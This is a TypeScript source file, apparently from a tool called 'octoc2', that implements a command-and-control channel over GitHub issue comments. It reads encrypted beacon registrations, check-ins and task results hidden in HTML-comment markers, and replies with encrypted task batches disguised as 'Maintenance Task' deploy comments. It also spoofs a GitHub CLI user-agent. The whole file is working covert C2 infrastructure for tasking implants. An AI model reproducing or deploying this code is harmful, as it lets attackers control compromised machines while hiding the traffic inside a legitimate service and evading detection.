import { Octokit } from "@octokit/rest";
import type { BeaconRecord, BeaconRegistry } from "../BeaconRegistry.ts";
import type { QueuedTask, TaskQueue } from "../TaskQueue.ts";
import { computeTaskResultDigest } from "@octoc2/shared";
import {
  base64ToBytes,
  bytesToString,
  encryptForBeacon,
  openSealBox,
} from "../crypto/sodium.ts";
import {
  DurablePollState,
  PollRunner,
  repositoryPollScope,
} from "../lib/PollRunner.ts";
import { sha256Hex } from "../store/index.ts";
import {
  RejectedArtifactError,
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
  type SecureChannelServices,
} from "./ChannelServices.ts";
import {
  claimDeliveries,
  finishDeliveries,
} from "./ChannelRuntime.ts";

const HEARTBEAT_RE =
  /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
const CIPHERTEXT_RE =
  /<!--\s*infra-diagnostic:[^\s:>]+:([A-Za-z0-9_\-+/=]+)\s*-->/;
const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

export async function resolveOperatorPublicKey(
  octokit: Octokit,
  owner: string,
  repo: string,
): Promise<Uint8Array> {
  try {
    const response = await octokit.rest.actions.getRepoVariable({
      owner,
      repo,
      name: OPERATOR_PUBKEY_VAR,
    });
    const encoded = response.data.value?.trim();
    if (encoded) {
      const key = await base64ToBytes(encoded);
      if (key.length === 32) return key;
    }
  } catch (error) {
    console.warn(
      `[IssuesChannel] Could not fetch '${OPERATOR_PUBKEY_VAR}':`,
      (error as Error).message,
    );
  }

  const encoded = process.env[OPERATOR_PUBKEY_VAR]?.trim();
  if (encoded) {
    const key = await base64ToBytes(encoded);
    if (key.length === 32) return key;
  }
  throw new Error(
    `[IssuesChannel] Set the '${OPERATOR_PUBKEY_VAR}' repository variable or environment variable`,
  );
}

export interface IssuesChannelConfig {
  owner: string;
  repo: string;
  token: string;
  operatorPublicKey: Uint8Array;
  operatorSecretKey: Uint8Array;
  pollIntervalMs?: number;
  octokit?: Octokit;
}

interface ParsedBeaconComment {
  commentId: number;
  messageId: string;
  issueNumber: number;
  type: "reg" | "ci" | "logs";
  ciphertext: string;
  /** Relay ingress is distinguishable from a direct control-repo comment. */
  transport?: "issues" | "proxy";
}

interface DispatchOutcome {
  outcome: "accepted" | "duplicate" | "rejected";
  beaconId?: string;
  taskId?: string;
}

export class IssuesChannel {
  private readonly octokit: Octokit;
  private readonly config: Omit<Required<IssuesChannelConfig>, "octokit">;
  private readonly initialPollTime = new Date(Date.now() - 5_000).toISOString();
  private readonly progress: DurablePollState;
  private readonly runner: PollRunner;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly taskQueue: TaskQueue,
    config: IssuesChannelConfig,
    private readonly services: SecureChannelServices,
  ) {
    this.config = { pollIntervalMs: 30_000, ...config };
    this.octokit = config.octokit ?? new Octokit({
      auth: config.token,
      headers: {
        "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
      },
    });
    this.progress = new DurablePollState(
      services.store,
      "issues-poll",
      repositoryPollScope(config.owner, config.repo),
      5_000,
    );
    this.runner = new PollRunner({
      name: "IssuesChannel",
      intervalMs: this.config.pollIntervalMs,
      poll: () => this.poll(),
      onError: (error) => {
        console.warn(
          "[IssuesChannel] Poll error:",
          error instanceof Error ? error.message : String(error),
        );
      },
    });
  }

  start(): void {
    this.runner.start();
    console.log(
      `[IssuesChannel] Starting poll loop (interval: ${this.config.pollIntervalMs}ms)`,
    );
  }

  async stop(): Promise<void> {
    await this.runner.stop();
  }

  async poll(): Promise<void> {
    const since = this.progress.timestampSince(this.initialPollTime);
    const comments = await this.octokit.paginate(
      this.octokit.rest.issues.listCommentsForRepo,
      {
        owner: this.config.owner,
        repo: this.config.repo,
        since,
        per_page: 100,
        sort: "created",
        direction: "asc",
      },
    );
    comments.sort((left, right) =>
      commentTimestamp(left).localeCompare(commentTimestamp(right)) ||
      left.id - right.id
    );

    for (const comment of comments) {
      const body = comment.body ?? "";
      const cursor = commentTimestamp(comment);
      const version = (comment as { updated_at?: string }).updated_at ??
        (comment as { created_at?: string }).created_at ??
        sha256Hex(body);
      const messageId =
        `comment:${comment.id}:${version}:${sha256Hex(body)}`;
      await this.progress.process({
        messageId,
        payload: body,
        cursor,
      }, async () => {
        if (!comment.issue_url) return { outcome: "rejected" };
        const issueNumber = extractIssueNumber(comment.issue_url);
        if (issueNumber === null) return { outcome: "rejected" };
        const parsed = parseBeaconComment(
          body,
          comment.id,
          messageId,
          issueNumber,
        );
        if (!parsed) return { outcome: "rejected" };
        return this.dispatch(parsed);
      });
    }
  }

  private async dispatch(
    comment: ParsedBeaconComment,
  ): Promise<DispatchOutcome> {
    try {
      switch (comment.type) {
        case "reg":
          return await this.onRegistration(comment);
        case "ci":
          return await this.onCheckin(comment);
        case "logs":
          return await this.onResult(comment);
      }
    } catch (error) {
      console.warn(
        `[IssuesChannel] Failed to process ${comment.type} ${comment.messageId}:`,
        (error as Error).message,
      );
      if (error instanceof RejectedArtifactError) {
        return { outcome: "rejected" };
      }
      throw error;
    }
  }

  private async onRegistration(
    comment: ParsedBeaconComment,
  ): Promise<DispatchOutcome> {
    const transport = comment.transport ?? "issues";
    const payload = await this.parseSealedArtifact(
      comment,
      parseCheckinPayload,
    );
    const beaconPublicKey = await this.parseBeaconPublicKey(payload.publicKey);
    const status = await this.services.identities.verifyAndRegisterCheckin(
      payload,
      payload.beaconId,
      transport === "proxy" ? 10 : 1,
      comment.issueNumber,
    );

    const encrypted = await encryptForBeacon(
      JSON.stringify({
        kind: "registration-ack",
        beaconId: payload.beaconId,
        registrationId: String(comment.commentId),
        ...(payload.identity && {
          registrationSequence: payload.identity.sequence,
        }),
        acceptedAt: new Date().toISOString(),
      }),
      beaconPublicKey,
      this.config.operatorSecretKey,
    );
    await this.postDeployComment(
      comment.issueNumber,
      payload.beaconId,
      "reg-ack",
      encrypted.nonce,
      encrypted.ciphertext,
    );
    return {
      outcome: checkinAuthorizesTaskDelivery(status)
        ? "accepted"
        : "duplicate",
      beaconId: payload.beaconId,
    };
  }

  private async onCheckin(
    comment: ParsedBeaconComment,
  ): Promise<DispatchOutcome> {
    const transport = comment.transport ?? "issues";
    const payload = await this.parseSealedArtifact(
      comment,
      parseCheckinPayload,
    );
    const beacon = this.registry.getByIssue(comment.issueNumber);
    if (!beacon || beacon.beaconId !== payload.beaconId) {
      throw new RejectedArtifactError(
        "signed checkin does not own this issue",
      );
    }
    const status = await this.services.identities.verifyAndRegisterCheckin(
      payload,
      beacon.beaconId,
      transport === "proxy" ? 10 : 1,
      comment.issueNumber,
    );

    if (checkinAuthorizesTaskDelivery(status)) {
      const pending = this.taskQueue.getDeliverableTasks(
        beacon.beaconId,
        transport,
      );
      if (pending.length > 0) {
        await this.deliverTasks(
          comment.issueNumber,
          beacon,
          pending,
          transport,
        );
      }
    }
    return {
      outcome: checkinAuthorizesTaskDelivery(status)
        ? "accepted"
        : "duplicate",
      beaconId: beacon.beaconId,
    };
  }

  private async onResult(
    comment: ParsedBeaconComment,
  ): Promise<DispatchOutcome> {
    const transport = comment.transport ?? "issues";
    const result = await this.parseSealedArtifact(
      comment,
      parseTaskResult,
    );
    const beacon = this.registry.getByIssue(comment.issueNumber);
    if (!beacon || beacon.beaconId !== result.beaconId) {
      throw new RejectedArtifactError(
        "signed result does not own this issue",
      );
    }
    const outcome = assertAcceptedResult(
      await this.services.tasks.acceptSignedResult(
        result,
        beacon.beaconId,
        {
          channel: transport,
          messageId: comment.messageId,
          payloadDigest: sha256Hex(comment.ciphertext),
        },
      ),
    );
    const acceptedAt = new Date().toISOString();
    const encrypted = await encryptForBeacon(
      JSON.stringify({
        kind: "result-acceptance",
        beaconId: beacon.beaconId,
        taskId: result.taskId,
        resultDigest: await computeTaskResultDigest(result),
        acceptedAt,
      }),
      await base64ToBytes(beacon.publicKey),
      this.config.operatorSecretKey,
    );
    await this.postDeployComment(
      comment.issueNumber,
      beacon.beaconId,
      `result-ack-${result.taskId}`,
      encrypted.nonce,
      encrypted.ciphertext,
    );
    return {
      outcome,
      beaconId: beacon.beaconId,
      taskId: result.taskId,
    };
  }

  private async deliverTasks(
    issueNumber: number,
    beacon: BeaconRecord,
    tasks: QueuedTask[],
    transport: "issues" | "proxy" = "issues",
  ): Promise<void> {
    const deliveries = claimDeliveries(
      this.services,
      transport,
      beacon.beaconId,
      tasks,
      Math.max(this.config.pollIntervalMs * 2, 60_000),
    );
    if (deliveries.length === 0) return;
    try {
      const encrypted = await encryptForBeacon(
        JSON.stringify(deliveries.map(({ task }) => ({
          taskId: task.taskId,
          kind: task.kind,
          args: task.args,
          ref: task.ref,
        }))),
        await base64ToBytes(beacon.publicKey),
        this.config.operatorSecretKey,
      );
      await this.postDeployComment(
        issueNumber,
        beacon.beaconId,
        deliveries[0]?.task.ref ?? "batch",
        encrypted.nonce,
        encrypted.ciphertext,
      );
      finishDeliveries(this.services, deliveries, "delivered");
    } catch (error) {
      finishDeliveries(
        this.services,
        deliveries,
        "transient_failure",
        error,
      );
      throw error;
    }
  }

  private async postDeployComment(
    issueNumber: number,
    beaconId: string,
    ref: string,
    nonce: string,
    ciphertext: string,
  ): Promise<void> {
    const epoch = Math.floor(Date.now() / 1000);
    const body = [
      `<!-- job:${epoch}:deploy:${ref} -->`,
      "",
      `### Maintenance Task · Ref \`${ref}\``,
      "",
      "Automated maintenance task queued for execution.",
      "",
      "<details>",
      "<summary>Operation parameters</summary>",
      "",
      "```text",
      ciphertext,
      "```",
      "",
      "</details>",
      `<!-- ${nonce} -->`,
    ].join("\n");
    await this.octokit.rest.issues.createComment({
      owner: this.config.owner,
      repo: this.config.repo,
      issue_number: issueNumber,
      body,
    });
    console.log(
      `[IssuesChannel] Posted deploy comment (ref=${ref}) on issue #${issueNumber} for ${beaconId}`,
    );
  }

  private async openSeal(ciphertext: string): Promise<Uint8Array> {
    return openSealBox(
      ciphertext,
      this.config.operatorPublicKey,
      this.config.operatorSecretKey,
    );
  }

  private async parseSealedArtifact<T>(
    comment: ParsedBeaconComment,
    parse: (serialized: string) => T,
  ): Promise<T> {
    try {
      return parse(bytesToString(await this.openSeal(comment.ciphertext)));
    } catch (error) {
      if (error instanceof RejectedArtifactError) throw error;
      throw new RejectedArtifactError(
        `malformed ${comment.type} artifact: ${errorMessage(error)}`,
      );
    }
  }

  private async parseBeaconPublicKey(encoded: string): Promise<Uint8Array> {
    try {
      const key = await base64ToBytes(encoded);
      if (key.length !== 32) {
        throw new Error("public key must contain 32 bytes");
      }
      return key;
    } catch (error) {
      throw new RejectedArtifactError(
        `invalid beacon encryption key: ${errorMessage(error)}`,
      );
    }
  }
}

function extractIssueNumber(url: string): number | null {
  const match = /\/issues\/(\d+)$/.exec(url);
  return match ? Number.parseInt(match[1]!, 10) : null;
}

function parseBeaconComment(
  body: string,
  commentId: number,
  messageId: string,
  issueNumber: number,
): ParsedBeaconComment | null {
  const marker = HEARTBEAT_RE.exec(body);
  if (!marker || marker[2] === "deploy") return null;
  const encrypted = CIPHERTEXT_RE.exec(body);
  if (!encrypted) return null;
  return {
    commentId,
    messageId,
    issueNumber,
    type: marker[2] as "reg" | "ci" | "logs",
    ciphertext: encrypted[1]!.trim(),
    transport: body.includes("<!-- octoc2-relay:ingress:")
      ? "proxy"
      : "issues",
  };
}

function commentTimestamp(comment: {
  created_at?: string | null;
  updated_at?: string | null;
}): string {
  const candidate = comment.updated_at ?? comment.created_at;
  const timestamp = typeof candidate === "string"
    ? new Date(candidate).getTime()
    : Number.NaN;
  return Number.isFinite(timestamp)
    ? new Date(timestamp).toISOString()
    : new Date().toISOString();
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}
